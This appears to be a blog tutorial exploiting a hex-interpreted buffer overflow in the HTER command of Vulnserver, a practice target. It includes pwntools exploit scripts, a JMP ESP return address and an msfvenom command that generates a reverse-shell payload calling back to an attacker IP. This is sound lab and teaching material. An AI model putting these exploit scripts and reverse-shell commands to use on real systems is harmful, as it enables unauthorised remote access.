---
title: "Vulnserver: Buffer overflow in HTER command with a small obstacle"
date: 2019-09-09
---

We are back from a vacation and it's time to keep going with the Vulnserver series of posts. In this post we are going to exploit the crash found in the HTER command of Vulnserver. And important note to make before starting is that this post is going to be shorter than the previous one since I'm going to skip the steps that we have already seen.<!--more-->

## Analyzing the crash
In this case the registers in Immunity Debugger looked like in the image below after the crash.

{{img(id="img/immunitydbg1.PNG" class="textCenter")}}

{{img(id="img/immunitydbg2.PNG" class="textCenter")}}

We can see that we have overwrote EIP and produced a crash, but there's something peculiar about the value in EIP. The command that caused the crash was the following:

```bash
HTER AAAAAAAAAAAAAAAAAAA... # There's supposed to be 5000 As here
```

So with that command we expect EIP to be equal to 41414141 but instead it's AAAAAAAA so that makes us think that the target is interpreting our input as hex. This means that from now own we should feed the string representation of the hex values we want to use.

So instead of generating a De Brujin pattern like we normally do, we modify the alphabet used to respect the constraints.

```bash
$ cyclic -a "123456789ABCDEF" 5000
```

After the crash we can simply check the offset using the command again but we have to take into account the endianness and that we are using the string representation of the hex values so with the following crash:

{{img(id="img/immunitydbg3.PNG" class="textCenter")}}

We see that it crashed at EIP 0xC137B137, if we reverse the endianness we obtain 0x37B137C1 and since we are looking at the string representation we should search for the first for character "37B1".

```bash
$ cyclic -a "123456789ABCDEF" -l "37B1"
2046
```

So we obtained our EIP offset that we can check with a python script like the following:

```python
from pwn import *

# IP and port of the target (Vulnserver).
ip = "192.168.1.128"
port = 9999

cmd= "HTER "
offset_eip = 2046
# Note that we have to take into account the endianness in EIP too.
eip = "BEBAFECA" # EIP = 0xCAFEBABE

# Create our payload.
payload = fit({
    0:cmd,
    offset_eip:eip,
    },length=5000,filler=de_bruijn(alphabet="123456789ABCDEF"))

io = remote(ip,port)
io.readline()
io.sendline(payload)
```

And it's confirmed in Immunity Debugger:

{{img(id="img/immunitydbg4.PNG" class="textCenter")}}

## Exploiting
After all of that exploitation is pretty straight forward. First of all, we find an address that has the command JMP ESP to execute our shellcode in the stack. For that we just use the command jmp available in the Mona plugin for Immunity Debugger.

{{img(id="img/immunitydbg5.PNG" class="textCenter")}}

We can use the first address shown 0x625011af which is part of essfunc.dll and has ASLR disabled.

After that we simple need some shellcode which we can generate with msfvenom.

```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.139 LPORT=443 EXITFUNC=thread -f hex -b "\x00\x0a"
```

Remember that we have to use the string representation so that's why we choose the hex format here.

Now all that's left is to put everything together in our exploit.

```python
from pwn import *

# IP and port of the target (Vulnserver).
ip = "192.168.1.128"
port = 9999

cmd= "HTER "
offset_eip = 2046
# Note that we have to take into account the endianness in EIP too.
eip = "AF115062" # Address of instruction we want to run (Ex. jmp esp).

# Here we put the shellcode we want to execute.
offset_sc = offset_eip + 8
shellcode = "90"*16
shellcode += "dac0d9742..." # Cut for brevity.

# Create our payload.
payload = fit({
    0:cmd,
    offset_eip:eip,
    offset_sc:shellcode
    },length=5000,filler=de_bruijn(alphabet="123456789ABCDEF"))

io = remote(ip,port)
io.readline()
io.sendline(payload)
```

And that's it, a buffer overflow very similar to the previous one that adds some constraints which allowed us to learn a few tricks.

See you guys in the next post.